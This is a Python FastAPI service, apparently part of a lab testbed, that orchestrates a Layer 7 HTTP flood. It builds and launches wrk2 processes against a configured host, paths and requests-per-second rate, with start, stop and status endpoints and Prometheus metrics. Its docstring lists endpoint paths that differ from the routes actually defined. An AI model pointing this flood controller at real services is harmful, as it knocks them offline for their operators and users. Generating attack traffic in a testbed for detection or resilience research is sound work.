"""
Attacker 1 - Layer 7 HTTP Flood Attack Controller

FastAPI server that controls wrk2 processes to execute HTTP flood attacks.
Attack parameters are configured via MASTER_CONFIG.json.

API Endpoints:
  POST /attack/start  - Start attack
  POST /attack/stop   - Stop attack
  GET  /attack/status - Get attack status
  GET  /config        - View current config
  GET  /metrics       - Prometheus metrics
"""

from fastapi import FastAPI, HTTPException
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from prometheus_client import Counter, Gauge, generate_latest
from node_monitor import Registry
from pathlib import Path
import json
import subprocess
import signal
import os
import threading
from pydantic import BaseModel
from typing import Dict, List, Optional, Any
import time
import docker

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# Configuration Loading
# ============================================================================

MASTER_CONFIG_PATH = Path("../MASTER_CONFIG.json")

def write_master_config(configJson: str):
    if not MASTER_CONFIG_PATH.exists():
        raise RuntimeError("MASTER_CONFIG.json not found")
    with open(MASTER_CONFIG_PATH, 'w') as f:
        f.write(configJson)
        f.close()
    
    return True

def load_master_config():
    """Load config from MASTER_CONFIG.json. Restart container to reload."""
    if not MASTER_CONFIG_PATH.exists():
        raise RuntimeError("MASTER_CONFIG.json not found")
    with open(MASTER_CONFIG_PATH) as f:
        return json.load(f)
    

class Metrics(BaseModel):
    cpu: bool
    disk: bool
    network: bool
    fastapi: bool
    memory: bool

class Monitor(BaseModel):
    enabled: bool
    interval: Optional[int] = None
    metrics: Metrics


class AttackConfig(BaseModel):
    attack_type: str
    threads: int 
    connections: int
    duration_seconds: int
    rate_rps: int
    method: str
    paths: List[str]
    path_ratios: List[float]
    # headers: Optional[Dict[str, str]] = None
    keep_alive: bool 

class Config(BaseModel):
    id: str
    name: str
    type: str
    enabled: bool
    forward_host: str
    forward_port: str
    host: str
    port: str
    monitor: Monitor
    custom_config: AttackConfig
# ============================================================================
# Prometheus Metrics
# ============================================================================

ATTACK_REQUESTS_SENT = Counter(
    "attack_requests_sent_total",
    "Total HTTP requests sent by attacker",
    ["path", "method"]
)

ATTACK_REQUESTS_PER_SECOND = Gauge(
    "attack_requests_per_second",
    "Current requests per second",
    ["path"]
)

ATTACK_BYTES_SENT = Counter(
    "attack_bytes_sent_total",
    "Total bytes sent by attacker",
    ["path"]
)

ATTACK_ACTIVE_CONNECTIONS = Gauge(
    "attack_active_connections",
    "Active attack connections"
)

ATTACK_STATUS = Gauge(
    "attack_status",
    "Attack status (0=idle, 1=running, 2=stopped)"
)

# ============================================================================
# Attack State Management
# ============================================================================

attack_processes: List[Dict] = []  # List of running wrk2 process info
attack_status = "idle"              # idle | running | stopped
attack_lock = threading.Lock()      # Thread safety for state changes

# Register with node_monitor for system metrics
registry = Registry()
registry.registerFastAPIApp(app=app)

# ============================================================================
# Attack Configuration
# ============================================================================

def get_attack_config() -> Dict:
    """
    Extract attack config from MASTER_CONFIG.json with defaults.
    
    Returns dict with: attack_type, threads, connections, rate_rps,
    method, paths, path_ratios, headers, keep_alive, target_host, target_port
    """
    MASTER_CONFIG = load_master_config() 
    custom_config = MASTER_CONFIG.get("custom_config", {})
    
    if not custom_config:
        raise ValueError("No attack configuration found in custom_config")
    
    # Fallback to forward_host/port if target not specified
    forward_host = custom_config.get("target_host", MASTER_CONFIG.get("forward_host", "10.0.0.1"))
    forward_port = custom_config.get("target_port", MASTER_CONFIG.get("forward_port", "8000"))
    
    return {
        "attack_type": custom_config.get("attack_type", "http_flood"),
        "threads": custom_config.get("threads", 4),
        "duration_seconds": custom_config.get("duration_seconds", 30),
        "connections": custom_config.get("connections", 200),
        "rate_rps": custom_config.get("rate_rps", 5000),
        "method": custom_config.get("method", "GET"),
        "paths": custom_config.get("paths", ["/"]),
        "path_ratios": custom_config.get("path_ratios", [1.0]),
        # "headers": custom_config.get("headers", {}),
        "keep_alive": custom_config.get("keep_alive", True),
        "forward_host": forward_host,
        "forward_port": forward_port
    }

# wrk -t4 -c2000 -d60s -R5000 http://target:8000/api/feed


# ============================================================================
# wrk2 Command Builder
# ============================================================================

def build_wrk2_command(config: Dict, path: str, path_rate_rps: int) -> List[str]:
    """
    Build wrk2 command line for attacking a specific path.
    
    Args:
        config: Attack configuration dict
        path: URL path to attack (e.g., "/api/test")
        path_rate_rps: Requests per second for this path
    
    Returns:
        List of command arguments for subprocess
    """
    target_url = f"http://{config['forward_host']}:{config['forward_port']}{path}"
    
    cmd = [
        "wrk",
        "-t", str(config["threads"]),      # Thread count
        "-c", str(config["connections"]),  # Connection count
        "-R", str(path_rate_rps),          # Rate limit (required for wrk2)
        "-d", str(config["duration_seconds"]),                   # Run until manually stopped
        "--timeout", "2s",
        "--latency"
    ]
    
    # Add custom headers
    if config.get("headers"):
        for key, value in config["headers"].items():
            cmd.extend(["-H", f"{key}: {value}"])
    
    # Disable keep-alive by adding Connection: Close header
    if not config["keep_alive"]:
        cmd.extend(["-H", "Connection: Close"])
    
    # Add HTTP method if not GET (wrk2 defaults to GET)
    if config["method"] != "GET":
        cmd.extend(["-m", config["method"]])
    
    cmd.append(target_url)
    return cmd

# ============================================================================
# Attack Control Functions
# ============================================================================

def start_attack() -> Dict:
    """
    Start HTTP flood attack with config from MASTER_CONFIG.json.
    
    Launches separate wrk2 processes for each path, distributing
    total RPS according to path_ratios.
    
    Returns:
        Dict with status, process count, total RPS, and paths
    """
    global attack_processes, attack_status
    
    with attack_lock:
        if attack_status == "running":
            raise HTTPException(status_code=400, detail="Attack already running")
        
        # try:
        config = get_attack_config()
        
        # Validate paths and ratios match
        if len(config["paths"]) != len(config["path_ratios"]):
            raise ValueError("paths and path_ratios must have the same length")
        
        if abs(sum(config["path_ratios"]) - 1.0) > 0.01:
            raise ValueError("path_ratios must sum to 1.0")
        
        # Calculate RPS per path (e.g., 5000 RPS with [0.8, 0.2] = [4000, 1000])
        total_rps = config["rate_rps"]
        path_rps_list = [int(total_rps * ratio) for ratio in config["path_ratios"]]
        
        # Handle rounding errors by adding remainder to first path
        diff = total_rps - sum(path_rps_list)
        if diff > 0:
            path_rps_list[0] += diff
        
        # Launch wrk2 process for each path
        attack_processes = []
        for path, path_rps in zip(config["paths"], path_rps_list):
            if path_rps > 0:
                cmd = build_wrk2_command(config, path, path_rps)

                print(cmd)
                
                # Start in new process group so we can kill entire group later
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    preexec_fn=os.setsid
                )

                attack_processes.append({
                    "process": process,
                    "path": path,
                    "rps": path_rps,
                    "cmd": " ".join(cmd)
                })
        
        if not attack_processes:
            raise ValueError("No attack processes started (all RPS values were 0)")
        
        attack_status = "running"
        ATTACK_STATUS.set(1)
        
        return {
            "status": "started",
            "processes": len(attack_processes),
            "total_rps": total_rps,
            "paths": [p["path"] for p in attack_processes]
        }
            
        # except Exception as e:
        #     attack_status = "stopped"
        #     ATTACK_STATUS.set(2)
        #     raise HTTPException(status_code=500, detail=f"Failed to start attack: {str(e)}")


def stop_attack() -> Dict:
    """
    Stop all running wrk2 attack processes.
    
    Sends SIGTERM to each process group and waits for clean shutdown.
    
    Returns:
        Dict with status and count of stopped processes
    """
    global attack_processes, attack_status
    
    with attack_lock:
        if attack_status != "running":
            return {"status": "no_attack_running"}
        
        stopped_count = 0
        for proc_info in attack_processes:
            try:
                process = proc_info["process"]
                if process.poll() is None:  # Still running
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    process.wait(timeout=5)
                    stopped_count += 1
            except Exception:
                pass  # Process may have already terminated
        
        attack_processes = []
        attack_status = "stopped"
        ATTACK_STATUS.set(2)
        
        return {
            "status": "stopped",
            "processes_stopped": stopped_count
        }

# ============================================================================
# API Endpoints
# ============================================================================

@app.get("/health")
async def health():
    """Health check endpoint."""
    return {"status": "ok", "type": "attacker1"}


@app.get("/config")
async def get_config():
    """Get current master config and parsed attack config."""
    try:
        return load_master_config()
    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={"error": f"Failed to load config: {str(e)}"}
        )
    
@app.post("/config")
async def post_config(config: Config):
    print(config)
    configJson = config.model_dump_json(indent=2)
    write_master_config(configJson)
    return {"status": "ok", "message": "Config file modified sucesfully"}

@app.post("/start")
async def start_attack_endpoint():
    """Start HTTP flood attack using MASTER_CONFIG.json settings."""
    # try:
    return start_attack()
    # except HTTPException:
    #     raise
    # except Exception as e:
    #     raise HTTPException(status_code=500, detail=str(e))


@app.post("/stop")
async def stop_attack_endpoint():
    """Stop all running attack processes."""
    try:
        return stop_attack()
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/status")
async def get_attack_status():
    """Get current attack status and info about running processes."""
    with attack_lock:
        process_info = []
        for proc_info in attack_processes:
            process = proc_info["process"]
            is_running = process.poll() is None
            process_info.append({
                "path": proc_info["path"],
                "rps": proc_info["rps"],
                "running": is_running,
                "pid": process.pid if is_running else None,
                "cmd": proc_info["cmd"]
            })
        
        return {
            "status": attack_status,
            "processes": process_info,
            "total_processes": len(attack_processes)
        }


# @app.get("/metrics")
# def metrics():
#     """Prometheus metrics endpoint."""
#     return generate_latest()


@app.get("/")
async def root():
    """Root endpoint with service info and available endpoints."""
    return {
        "name": "Attacker 1 - Layer 7 HTTP Attacker",
        "status": attack_status,
        "endpoints": {
            "health": "/health",
            "config": "/config",
            "attack_start": "POST /attack/start",
            "attack_stop": "POST /attack/stop",
            "attack_status": "GET /attack/status",
            "metrics": "/metrics"
        }
    }

@app.get("/restart")
async def restart():
    if os.getenv("LOCAL"):
        thread = threading.Thread(
            target=run_local_restart
        )
        thread.start()
        return {"status": "ok", "message": "Awaiting docker restart via local restart command"}
    else:
        Path("/control/restart_required").touch()
        return {"status": "ok", "message": "Awaiting docker restart via systemd service"}

def run_local_restart():
    time.sleep(0.5) #time for /restart to return
    client = docker.from_env()
    client.containers.get("attacker1").restart()
    return True
